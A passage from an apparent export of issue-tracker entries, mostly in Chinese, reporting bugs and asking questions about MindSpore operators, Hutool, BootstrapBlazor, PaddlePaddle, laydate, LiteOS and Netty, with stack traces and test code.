obj_id) at diff times. # To avoid unexpected phase matched, add create_time to generate_name. generate_name = generate_name + '.' + str(self._create_time) self.enable_tuple_broaden = False if hasattr(self.obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = self.obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(compile_args, self.enable_tuple_broaden) phase = generate_name + '.' + str(key) if phase in ms_compile_cache: return phase # If enable compile cache, get the dependency files list and set to graph executor. self._set_compile_cache_dep_files() if self.jit_config_dict: self._graph_executor.set_jit_config(self.jit_config_dict) if self.obj is None: &gt; is_compile = self._graph_executor.compile(self.fn, compile_args, phase, True) E RuntimeError: UnsortedSegmentSum does not support 'batch_rank' on GPU, which means that 'vmap' cannot support UnsortedSegmentSum on GPU currently. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:604 SetOperatorInfo /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:357: RuntimeError 3、def test_unsorted_segment_prod_vmap_128(): fact = UnsortedSegmentProdFactory(input_shape=(128, 128, 3, 128), segment_ids=(2, 0, 1), num_segments=3) &gt; fact.forward_vmap_cmp(1.7) ../operations/test_unsortedsegmentprod.py:652: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/unsortedsegmentprod_ops.py:128: in forward_vmap_cmp out_vmap0 = forward_vmap_net(x_tensor, ids_tensor) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:555: in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:295: in __call__ phase = self.compile(args_list, self.fn.__name__) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._MindsporeFunctionExecutor object at 0x7f9310620d50&gt; args_list = (Tensor(shape=[128, 128, 3, 128], dtype=Float32, value= [[[[ 3.87107372e-01, -1.56307423e+00, -1.21868417e-01 ... 1.3...13374e-02 ... 2.58842796e-01, -1.40652788e+00, -7.67365396e-01]]]]), Tensor(shape=[3], dtype=Int32, value= [2, 0, 1])) method_name = 'after_vmap' def compile(self, args_list, method_name): """"""Returns pipeline for the given args."""""" # Check whether hook function registered on Cell object. if self.obj and hasattr(self.obj, ""_hook_fn_registered""): if self.obj._hook_fn_registered(): logger.warning(f""For 'Cell', it's not support hook function when using 'jit' decorator. "" f""If you want to use hook function, please use context.set_context to set "" f""pynative mode and remove 'jit' decorator."") # Chose dynamic shape tensors or actual input tensors as compile args. compile_args = self._generate_compile_args(args_list) # Restore the mutable attr for every arg. compile_args = _restore_mutable_attr(args_list, compile_args) generate_name = self.fn.__module__ + ""."" + self.fn.__name__ + ""."" + self.fn.__code__.co_filename + ""."" + \ str(self.fn.__code__.co_firstlineno) + '.' + str(id(self.fn)) if _pynative_executor.grad_flag(): generate_name = generate_name + "".grad"" if _is_pynative_parallel(): generate_name = generate_name[:generate_name.rfind(str(id(self.fn)))] + str(id(self.shard_parent_obj)) # Add key with obj if self.obj is not None: if self.obj.__module__ != self.fn.__module__: logger.info(f'`obj` module not equal to `fn` module: {self.obj.__module__}, {self.fn.__module__}') self.obj.__parse_method__ = method_name if isinstance(self.obj, ms.nn.Cell): generate_name = generate_name + '.' + str(self.obj.create_time) else: generate_name = generate_name + '.' + str(self._create_time) generate_name = generate_name + '.' + str(id(self.obj)) else: # Different instance of same class may use same memory(means same obj_id) at diff times. # To avoid unexpected phase matched, add create_time to generate_name. generate_name = generate_name + '.' + str(self._create_time) self.enable_tuple_broaden = False if hasattr(self.obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = self.obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(compile_args, self.enable_tuple_broaden) phase = generate_name + '.' + str(key) if phase in ms_compile_cache: return phase # If enable compile cache, get the dependency files list and set to graph executor. self._set_compile_cache_dep_files() if self.jit_config_dict: self._graph_executor.set_jit_config(self.jit_config_dict) if self.obj is None: &gt; is_compile = self._graph_executor.compile(self.fn, compile_args, phase, True) E RuntimeError: UnsortedSegmentProd does not support 'batch_rank' on CPU, which means that 'vmap' cannot support UnsortedSegmentProd on CPU currently. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/cpu/hal/hardware/cpu_device_context.cc:275 SetOperatorInfo /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:357: RuntimeError"
【众智】【计算-AICPU开发】CTCLossV2,"CTCLossV2 AICPU算子适配 + functional接口 + CPU算子迁移 + 算子反向 CTC (Connectionist Temporal Classification)是一种loss function。 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/nn_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/nn_ops.py log_probs targets input_lengths target_lengths neg_log_likelihood log_alpha blank Int 属性 reduction String 属性 zero_infinity Bool 属性 对应底层算子 对应底层AI CPU算子Logit Classify Name Type TypeRange Required Doc AttrDefault INPUT log_probs DT_FLOAT, DT_DOUBLE TRUE INPUT targets DT_INT32, DT_INT64 TRUE INPUT input_lengths DT_INT32, DT_INT64 TRUE INPUT target_lengths DT_INT32, DT_INT64 TRUE OUTPUT neg_log_likelihood DT_FLOAT, DT_DOUBLE TRUE OUTPUT log_alpha DT_FLOAT, DT_DOUBLE TRUE ATTR blank Int FALSE 0 ATTR reduction String FALSE ""mean"" ATTR zero_infinity Bool FALSE false PyTorch1.8.1接口： torch.nn.CTCLoss https://pytorch.org/docs/1.8.1/generated/torch.nn.CTCLoss.html 3. 异常处理 4. 算子反向 CTCLossV2Grad   <code>: def ctc_loss_v2(log_probs: tensor, targets: tensor, input_lengths: tensor, target_lengths: tensor, \ blank=0: Int, reduction=""mean"": str, zero_infinity=false: bool) -&gt; (tensor,tensor): return (neg_log_likelihood, log_alpha) class CTCLossV2(Primitive):"
"JsonParseException: Illegal character ((CTRL-CHAR, code 31))","有遇到的吗？请问如何解决？   <code>: Caused by: com.fasterxml.jackson.core.JsonParseException: Illegal character ((CTRL-CHAR, code 31)): only regular white space (\r, \n, \t) is allowed between tokens at [Source: (PushbackInputStream); line: 1, column: 2]"
通过reader获取writer时，无法写出到文件,"JDK版本： openjdk_8_201 hutool版本： 5.X.X 通过reader可以正常输出读取到的表格内容，通过reader获取writer时，无法写出到文件，代码如下，当没有加setDestfile时，没有任何反应，源文件text.xls内容没有任何改变，当加上setDestFile到一个新的文件目录，报错directory cannot be null 堆栈信息 <ol start=""3"">   <code>: ExcelReader reader = ExcelUtil.getReader(""E:\\text.xls""); ExcelWriter writer = reader.getWriter(); writer.writeCellValue(0, 9, ""设置值""); //writer.setDestFile(new File(""E://text2.xls"")).close(); writer.close(); java.lang.IllegalArgumentException: directory cannot be null at org.apache.poi.poifs.filesystem.FilteringDirectoryNode.&lt;init&gt;(FilteringDirectoryNode.java:66) at org.apache.poi.hssf.usermodel.HSSFWorkbook.write(HSSFWorkbook.java:1407) at org.apache.poi.hssf.usermodel.HSSFWorkbook.write(HSSFWorkbook.java:1374) at cn.hutool.poi.excel.ExcelWriter.flush(ExcelWriter.java:1054) at cn.hutool.poi.excel.ExcelWriter.flush(ExcelWriter.java:1028) at cn.hutool.poi.excel.ExcelWriter.flush(ExcelWriter.java:1014) at cn.hutool.poi.excel.ExcelWriter.close(ExcelWriter.java:1073)"
Table组件问题：升级到6.8.18版本以后，我的所有的列表页，就经常发生如下问题。但刷新两三次以后，又正常了。,"TimeStamp: 2022/7/31 下午5:40:31 OS: Microsoft Windows 10.0.19044 OSArchitecture: X64 ProcessArchitecture: X64 Framework: .NET 6.0.7 EnvironmentName: Development VSIDE: Microsoft Visual Studio Enterprise 2022 17.0 Message: Value cannot be null. (Parameter 'source') StackTrace: at System.Linq.ThrowHelper.ThrowArgumentNullException(ExceptionArgument argument) at System.Linq.Enumerable.ToList[TSource](IEnumerable1.get_Rows() at BootstrapBlazor.Components.Table1.&lt;&gt;c__DisplayClass1052_0.b__1(RenderTreeBuilder __builder2) at BootstrapBlazor.Components.Table1.BuildRenderTree(RenderTreeBuilder __builder) at Microsoft.AspNetCore.Components.Rendering.ComponentState.RenderIntoBatch(RenderBatchBuilder batchBuilder, RenderFragment renderFragment, Exception&amp; renderFragmentException) 组件版本 6.8.18 浏览器 all Server Side   <code>: 1 source) at BootstrapBlazor.Components.Table 1.HeaderCheckState() at BootstrapBlazor.Components.Table 1.&lt;&gt;c__DisplayClass1048_0.b__1(RenderTreeBuilder __builder2) at BootstrapBlazor.Components.Table"
[CT][MS][OP]MaxUnpool2D has some problems at ascend and cpu,": CPU Ascend /device ascend PyNative /device cpu Graph 、PyNative : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_maxunpool2d_argmax_out_of_range test_maxunpool2d_stride_i_0 检查MaxUnpool2D的doc资料 在Ascend和CPU环境，两种模式下，运行测试样例 1，pads描述成movement相关，不合适，建议修改； output_shape 建议给出格式。 2，The indices given out by MaxPool2d 描述不合适，建议修改， 请同时给出取值范围公式 3，x shape与argmax shape不一致时报错信息可以优化，应给出相应参数名 4， 在CPU 和 Ascend的环境，test_maxunpool2d_stride_i_0 出现错误 stride参数中，包含 0 时，出现错误 argmax参数取值超范围时, 报错信息不正确， 应给出正确的计算公式   <code>: pads (Union[int, tuple[int]]): The pad value to be filled, an int number that represents the depth, height and width of movement are both pads, or a tuple of two int numbers that represent depth, height and width of movement respectively. Default: 0. output_shape (tuple[int]) : The target output size is an optional input. If output_shape != (), then the shape of output is equal to output_shape. The dims N and C of output_shape must be equal to those of input. Default: (). - **argmax** (Tensor) - The indices given out by MaxPool2d. Tensor of shape must be same with input 'x'. Data type must be in int32 or int64. def test_maxunpool2d_input_20x3x7x10_input_argmax_18x6x8x12(): input_x = Tensor(np.random.randn(20, 3, 7, 10).astype(np.int32)) input_argmax = Tensor(np.random.randint(1, 20, size=(18, 6, 8, 12)).astype(np.int32)) fact = MaxUnpool2DMock(attributes={'ksize': (4, 4), 'strides': (2, 2), 'pads': (2, 2)}, inputs=[input_x, input_argmax]) #with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() &gt; output = real_run_op(obj, op_name, args) E ValueError: mindspore/core/utils/check_convert_utils.h:262 Check] The primitive[MaxUnpool2D]'s x_shape: [20,3,7,10,] must be equal to [18,6,8,12,] def test_maxunpool2d_stride_i_0(): input_x = Tensor(np.random.randint(1, 20, size=(30, 15, 18, 25)).astype(np.uint64)) input_argmax = Tensor(np.random.randint(1, 20, size=(30, 15, 18, 25)).astype(np.int64)) fact = MaxUnpool2DMock(attributes={'ksize': (4, 4), 'strides': (2, 0), 'pads': (2, 2)}, inputs=[input_x, input_argmax]) fact.forward_cmp() fact.grad_cmp() input = tensor([[[[12., 3., 14., ..., 5., 6., 5.], [15., 10., 2., ..., 13., 14., 5.], [ 6., 13., 1... [ 5., 2., 4., ..., 16., 8., 15.], [ 4., 14., 15., ..., 1., 6., 3.]]]], dtype=torch.float64) indices = tensor([[[[15, 10, 19, ..., 5, 17, 13], [17, 5, 6, ..., 2, 4, 17], [19, 14, 4, ..., 2, 1... [ 4, 10, 12, ..., 4, 10, 1], [13, 17, 12, ..., 6, 9, 6], [ 5, 1, 4, ..., 16, 19, 10]]]]) kernel_size = (4, 4), stride = (2, 0), padding = (2, 2), output_size = [34, 0] def max_unpool2d(input, indices, kernel_size, stride=None, padding=0, output_size=None): # type: (Tensor, Tensor, BroadcastingList2[int], Optional[BroadcastingList2[int]], BroadcastingList2[int], Optional[BroadcastingList2[int]]) -&gt; Tensor # noqa r""""""Computes a partial inverse of :class:`MaxPool2d`. See :class:`~torch.nn.MaxUnpool2d` for details. """""" if not torch.jit.is_scripting(): if type(input) is not Tensor and has_torch_function((input,)): return handle_torch_function( max_unpool2d, (input,), input, indices, kernel_size, stride=stride, padding=padding, output_size=output_size) kernel_size = _pair(kernel_size) if stride is not None: _stride = _pair(stride) else: _stride = kernel_size padding = _pair(padding) output_size = _unpool_output_size(input, kernel_size, _stride, padding, output_size) &gt; return torch._C._nn.max_unpool2d(input, indices, output_size) E RuntimeError: Found an invalid max index: 13 (output volumes are of size 34x0 def test_maxunpool2d_argmax_out_of_range(): input_x = Tensor(np.random.randn(3, 3, 6, 2).astype(np.int32)) input_argmax = Tensor(np.random.randint(400, 500, size=(3, 3, 6, 2)).astype(np.int32)) net = MaxUnpool2D(ksize=1, strides=1, pads=0) fact = AnyNetFactory(net=net) with pytest.raises(RuntimeError): &gt; fact(input_x, input_argmax) E Failed: DID NOT RAISE &lt;class 'RuntimeError'&gt; test_maxunpool2d.py:444: Failed def test_maxunpool2d_argmax_out_of_range(): input_x = Tensor(np.random.randn(3, 3, 6, 2).astype(np.int32)) input_argmax = Tensor(np.random.randint(400, 500, size=(3, 3, 6, 2)).astype(np.int32)) net = MaxUnpool2D(ksize=1, strides=1, pads=0) fact = AnyNetFactory(net=net) #with pytest.raises(RuntimeError): &gt; fact(input_x, input_argmax) test_maxunpool2d.py:444: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/meta.py:417: in __call__ return self.net(*args) ../share/utils.py:173: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:460: in __call__ raise err /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:457: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:352: in run_construct output = self.construct(*cast_inputs, **kwargs) ../share/ops/primitive/maxunpool2d_ops.py:22: in construct return self.maxunpool2d(input_x, argmax) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:247: in __call__ return _run_op(self, self.name, args) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/common/api.py:78: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[MaxUnpool2D]&lt;ksize=(1, 1, 1, 1), strides=(1, 1, 1, 1), pads=(1, 1, 0, 0), output_shape=(), data_format=NCHW&gt;, op_name = 'MaxUnpool2D' args = (Tensor(shape=[3, 3, 6, 2], dtype=Int32, value= [[[[ 1, 0], [ 0, 1], [ 0, 0], [ 0, 0], [ 0, 0], [ ...06, 498], [494, 461]], [[446, 439], [425, 404], [498, 436], [473, 423], [454, 471], [400, 441]]]])) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E RuntimeError: mindspore/ccsrc/runtime/framework/actor/kernel_actor.cc:195 OnMemoryAllocFinish] Launch kernel exception: Default/MaxUnpool2D-op0 E E #"
laydate 日期范围 结束日期没有上月上年按钮,"升级版本2.6.8之后 如图，结束日期想选7月都不知道怎么选 代码，range 试过 true 或者数组 都一样。   <code>: laydate.render({ elem: '#appointment_date' , type: 'date' , range: '~' , format: 'yyyy.MM.dd' });"
OsLockDepCheckIn异常处理中存在g_lockdepAvailable锁嵌套调用,"简要描述： OsLockDepCheckIn函数检测到异常锁后调用OsLockDepDumpLock函数时造成g_lockdepAvailable锁嵌套 ...... if (checkResult == LOCKDEP_SUCEESS) { /* * though the check may succeed, the waitLock still need to be set. * because the OsLockDepCheckIn and OsLockDepRecord is not strictly muti-core * sequential, there would be more than two tasks can pass the checking, but * only one task can successfully obtain the lock. <em>/ lockDep-&gt;waitLock = lock; lockDep-&gt;heldLocks[lockDep-&gt;lockDepth].lockAddr = requestAddr; lockDep-&gt;heldLocks[lockDep-&gt;lockDepth].waitTime = OsLockDepGetCycles(); /</em> start time */ } else { OsLockDepDumpLock(current, lock, requestAddr, checkResult); } ...... 【环境信息】: 网络环境 硬件开发板型号 软件版本信息或tag节点 测试环境 其他 【预置条件】: 【测试步骤】： 【预期结果】： 【实际结果】： 【恢复手段】： 【出现概率】：问题出现次数/实际测试次数 必现 【定位信息】： Log、截图、多媒体文件等，所有和问题有关的信息：   <code>: OsLockDepRelease(intSave);"
ubuntu运行报错,"jdk1.8，运行时 java -jar landlords-server/target/landlords-server-#{version}.jar -p 1024 报错，   <code>: Exception in thread ""main"" java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:48) at org.springframework.boot.loader.Launcher.launch(Launcher.java:87) at org.springframework.boot.loader.Launcher.launch(Launcher.java:50) at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:51) Caused by: java.lang.IllegalStateException: incompatible event loop type: io.netty.channel.epoll.EpollEventLoop at io.netty.channel.AbstractChannel$AbstractUnsafe.register(AbstractChannel.java:469) at io.netty.channel.SingleThreadEventLoop.register(SingleThreadEventLoop.java:80) at io.netty.channel.SingleThreadEventLoop.register(SingleThreadEventLoop.java:74) at io.netty.channel.MultithreadEventLoopGroup.register(MultithreadEventLoopGroup.java:86) at io.netty.bootstrap.AbstractBootstrap.initAndRegister(AbstractBootstrap.java:333) at io.netty.bootstrap.AbstractBootstrap.doBind(AbstractBootstrap.java:282) at io.netty.bootstrap.AbstractBootstrap.bind(AbstractBootstrap.java:246) at org.nico.ratel.landlords.server.SimpleServer.main(SimpleServer.java:35) ... 8 more"
Add interpolation_op,"interp_op: 输入 X: [m, n] tensor, Y: [m, n] tensor, W: [n] tensor 输出 Out: [m, n] tensor 公式： 该op可以用minus_op, add_op和elementwise_mul_op组合起来：   <code>: Out.row[i] = W[i] * X.row[i] + (1 - W[i]) * Y.row[i] Out= W*X+(1-W)*Y=W(X-Y)+X"
layui table表格宽度属性优化,"以上的width是否可以添加max-width和min-width属性   <code>: cols:[[ {field:'id',width:200,title:'ID'} ]]"
BaseFragment 中的mState ,public class BaseFragment extends Fragment implements 请问这里mState为什么要使用static呢?   <code>: public static int mState = STATE_NONE;
注销登录优化（内附解决方法）,问题： 删除已登录的账号，该账号注销登录后会一直提示“已登录”。 原因： 查看注销登录代码，发现代码未找到账号就直接return true，而未将session销毁。   <code>: application/admin/library/Auth.php
多program互相影响的问题,"hi 我下边这个程序，定义了两个Program，分别在两个Program里定义了一个FC层，名字相同但是输出不同。我理解这两个program里的变量应该是互相不影响的，所以两个program的输出应该也是不同的（虽然他们名字一样），但是实际输出并不是。 输出如下： 看起来prog2把prog1覆盖了。请问这是什么情况，要怎么解决使得两个program各自分别输出互不影响啊 谢谢   <code>: import paddle.fluid as fluid import numpy as np prog1 = fluid.Program() start_prog1 = fluid.Program() with fluid.program_guard(prog1, start_prog1): with fluid.unique_name.guard(): x = fluid.layers.data(name='x', shape=[-1, 4], dtype='float32') y1 = fluid.layers.fc(x, size=1) prog2 = fluid.Program() start_prog2 = fluid.Program() with fluid.program_guard(prog2, start_prog2): with fluid.unique_name.guard(): x = fluid.layers.data(name='x', shape=[-1, 4], dtype='float32') y2 = fluid.layers.fc(x, size=2) place = fluid.CPUPlace() exe = fluid.Executor(place) exe.run(start_prog1) exe.run(start_prog2) feed_x = np.random.rand(3,4).astype('float32') print feed_x print exe.run(prog1, feed={'x':feed_x}, fetch_list=[y1])[0] print exe.run(prog2, feed={'x':feed_x}, fetch_list=[y2])[0] [[0.15301736 0.47217232 0.43869737 0.00271489] [0.4223052 0.5610767 0.5118477 0.180553 ] [0.0171026 0.61575365 0.324812 0.45415097]] [[-0.45586294 0.14294818] [-0.71337724 0.3381655 ] [-0.23540677 0.6197809 ]] [[-0.45586294 0.14294818] [-0.71337724 0.3381655 ] [-0.23540677 0.6197809 ]]"
Concat operator,"RFC 在将ShuffleNetV2的GPU版本移植到Ascend版本时，需要特别处理才能运行。 return P.Concat(1)((x_proj, self.branch_main(x)))   <code>: if self.stride == 1: x_proj, x = self.channel_shuffle(old_x) return P.Concat(1)((x_proj, self.branch_main(x)))"
"从优化算法角度看，像layers.elementwise_max, layers.clip这些不可导的op是如何被计算导数，并参与梯度优化过程的？","比如下面这些代码，来自如下链接代码中的182行：https://github.com/PaddlePaddle/PARL/blob/develop/parl/algorithms/fluid/ppo.py   <code>: pg_ratio = layers.exp(logprob - old_logprob) clipped_pg_ratio = layers.clip(pg_ratio, 1 - self.epsilon, 1 + self.epsilon) surrogate_loss = layers.elementwise_min( advantages * pg_ratio, advantages * clipped_pg_ratio) loss = 0 - layers.reduce_mean(surrogate_loss)"
[CT][MS][OCCM][InplaceAdd]算子vmap报错AssertionError,"test_inplaceadd.py:463: self = InplaceAddFactory&lt;&gt;, net = WrapOp&lt;&gt;, in_axes = -1, run_time = 10, improve_times = 2 inputs = (Tensor(shape=[32, 128, 32, 16], dtype=Float32, value= [[[[ 1.28859329e+00, 1.51480806e+00, 8.12665299e-02 ... 5.82...-01], [-2.99056657e-02, -4.40140247e-01, -9.10091937e-01 ... -1.51650116e-01, -4.95995700e-01, -2.99879491e-01]]]])) nest_net_vmap = &lt;function _Vmap.call..after_vmap at 0x7f8074112290&gt; nest_output = Tensor(shape=[16, 32, 32, 128], dtype=Float32, value= [[[[ 1.28859329e+00, -1.73097706e+00, 4.91053343e-01 ... -1.797...e-01], [ 2.78806686e-01, -5.06980382e-02, 2.18826458e-01 ... -2.21539587e-02, -5.59892654e-02, -7.97026396e-01]]]]) nest_end_to_end_duration = 0.34657458999572555 E AssertionError /mode graph test_vmap_inplaceadd 正常用例 用例通过   <code>: def test_vmap_inplaceadd(): fact = InplaceAddFactory(inputx_shape=(32, 128, 32, 16), inputv_shape=(1, 128, 32, 16), indices=18, dtype1=np.float32, dtype2=np.float32) input_x_me = Tensor(fact.input_x_np) input_v_me = Tensor(fact.input_v_np) inplace_net = InplaceAdd(fact.indices) fact.vmap_cmp(inplace_net, -1, 10, 2, input_x_me, input_v_me) def vmap_cmp(self, net, in_axes, run_time, improve_times, *inputs): ''' vmap for op forward and grad :param net: the vmap net for forward and grad :param in_axes: the batch parameter :param run_time: the times for running :param improve_times: the improve times which vmap is better than for :param inputs: the inputs :return: the assert results ''' self.pure_net_vmap = vmap(net, in_axes=in_axes, out_axes=0) nest_net_vmap = self.nest_net_vmap(net, in_axes) # Call self net to warm up op.Abs()(Tensor(5.0)) _pynative_executor.sync() self.time_stamp() # End To End nest vmap time(compile graph + run graph). nest_output = nest_net_vmap(*inputs) _pynative_executor.sync() nest_end_to_end_duration = self.time_stamp() # Total nest vmap time(run_graph). for _ in range(run_time): nest_output = nest_net_vmap(*inputs) _pynative_executor.sync() total_nest_stamp = self.time_stamp() nest_duration = total_nest_stamp / run_time # End to End foreach vamp time(compile graph + run graph). foreach_output = self.foreach_vmap(*inputs) _pynative_executor.sync() foreach_end_to_end_duration = self.time_stamp() # Total foreach vmap time(run_graph). for _ in range(run_time): foreach_output = self.foreach_vmap(*inputs) _pynative_executor.sync() total_foreach_stamp = self.time_stamp() foreach_duration = total_foreach_stamp / run_time logger.info(""foreach_end_to_end_duration: {}"".format(foreach_end_to_end_duration)) logger.info(""nest_end_to_end_duration: {}"".format(nest_end_to_end_duration)) logger.info(""foreach_duration: {}"".format(foreach_duration)) logger.info(""nest_duration: {}"".format(nest_duration)) logger.info(""improve_times: {}"".format(foreach_duration / nest_duration)) if isinstance(nest_output, (tuple, list)): num = len(nest_output) for i in range(num): allclose_nparray(nest_output[i].asnumpy(), foreach_output[i].asnumpy(), self.loss, self.loss) else: allclose_nparray(nest_output.asnumpy(), foreach_output.asnumpy(), self.loss, self.loss) assert foreach_end_to_end_duration &gt; nest_end_to_end_duration assert foreach_duration &gt; nest_duration * improve_times"
[CT][MS][reinforcement]Reinforcement Test Cases：The pointer[value] is null.,"The pointer[value] is null. / 硬件环境: /device cpu : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_reinforcement_mcts_002 pytest -s reinforcement/test_reinforcement_mcts.py::test_reinforcement_mcts_002 case pass   <code>: self = &lt;mindspore.common.api._PyNativeExecutor object at 0x7fdbeec690d0&gt; args = (Prim[Custom]&lt;func_name=/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore_rl/utils/mcts/libmcts_cpu.so...r', 'total_num_player'], primitive_target=CPU, autodiff=False&gt;, 'Custom', (Tensor(shape=[], dtype=Float32, value= 1),)) def real_run_op(self, *args): """""" Run single op. Args: args (tuple): Op prim and input arguments. Return: Tensor, result of run op. """""" &gt; return self._executor.real_run_op(*args) E RuntimeError: E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/cpu/hal/hardware/cpu_device_context.cc:340 CreateKernel /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:997: RuntimeError ----------------------------- Captured stderr call ----------------------------- [ERROR] KERNEL(21926,7fde25033740,python):2022-11-07-06:38:57.210.872 [mindspore/ccsrc/plugin/device/cpu/kernel/custom/custom_aot_cpu_kernel.cc:102] Init] For 'Custom' on CPU, operator failed when executing user defined file /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore_rl/utils/mcts/libmcts_cpu.so! Error message is The pointer[value] is null."
时区问题,"pig版本:3.1.4 有些项目在服务器部署时获取到的时区是utc，差了8小时，有没有什么地方配置统一时区，将时区改为cst，还是说自己在每个应用启动类中都加入   <code>: TimeZone.setDefault(TimeZone.getTimeZone(""Asia/Shanghai""));"
testsuites的unittests的多核编译选项问题,"不应该用单板名来控制是否开启多核选项，而应该用多核的选项。链接如下： https://gitee.com/openharmony/kernel_liteos_a/blob/master/testsuites/unittest/BUILD.gn#L34 而应该通过device目录下的文件，新增编译选项   <code>: if (board_name == ""hispark_taurus"") { local_flags += [ ""-DLOSCFG_USER_TEST_SMP"" ] } config.gni"
BootstrapInput 的ShowLabel=“false”无效,"不显示Input的Label，在3.1.9版本设置 ShowLabel=""false""是可以的，但是升级到 3.1.10或者3.1.11时，设置了 ShowLabel=""false""还是会显示出来Label，不管有没有设置DisplayText 无Label 实际结果 有Label   <code>: &lt;div class=""form-group col-12""&gt; &lt;BootstrapInput TItem=""string"" placeholder=""请输入 ..."" @bind-Value=""@BindValue"" ShowLabel=""false""&gt; &lt;/BootstrapInput&gt; &lt;/div&gt;"
错误日记的追加,欢迎大家来补充对这块错误日记的需求。   <code>: 【活跃】442484396(442484396) 13:20:46 @dogstar 建议debug模式把报错都打印出来 生产模式用户配置错误等级，然后把错误日志写到某个文件中 【活跃】44248439 2016/10/15 11:54:57 有些时候还是需要的，平时可以关闭，但调试的时候生产环境是不允许打印错误到前端的
Check failed: cudaSuccess == err (0 vs. 8) [hl_gpu_apply_unary_op failed] CUDA error: invalid device function,os:linux 16.04 代码：DeepSpeech2 语音识别 运行环境: DeepSpeech2 中提供的ｄｏｃｋｅｒ镜像 ＧＰＵ:titan v ｃｕｄａ:9.2.148 driver version:10.0 在训练ｄｅｅｐspeech2 语音识别模型的时候报错： 我Ｇｏｏｇｌｅ过这个问题，有说是驱动版本的问题，所以也尝试过几个版本的驱动（410.93、410.７９、３９６．３７等），都没有解决 同样的ｄｏｃｋｅｒ和代码，同样的cuda版本及驱动版本，我在另外的几块ＧＰＵ（ＧＴＸ１０８０、ＧＴＸ１０７０）上也试过，是可以正常运行的。 ｔｉｔａｎV的ＧＰＵ运行其它的代码（基于ｔｅｎｓｏｒｆｌｏｗ）是没有问题的，所以我觉的可能是ｐａｄｄｌｅ的问题，与ＴＡＮＴＩＶ的ＧＰU不兼容？需要怎么做才能解决这个问题，希望能获得帮助，谢谢！   <code>: +-----------------------------------------------------------------------------+ | NVIDIA-SMI 410.93 Driver Version: 410.93 CUDA Version: 10.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 TITAN V Off | 00000000:01:00.0 Off | N/A | | 0% 46C P0 37W / 250W | 0MiB / 12065MiB | 0% Default | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: GPU Memory | | GPU PID Type Process name Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ F0326 09:05:26.830855 23 hl_gpu_matrix_kernel.cuh:181] Check failed: cudaSuccess == err (0 vs. 8) [hl_gpu_apply_unary_op failed] CUDA error: invalid device function
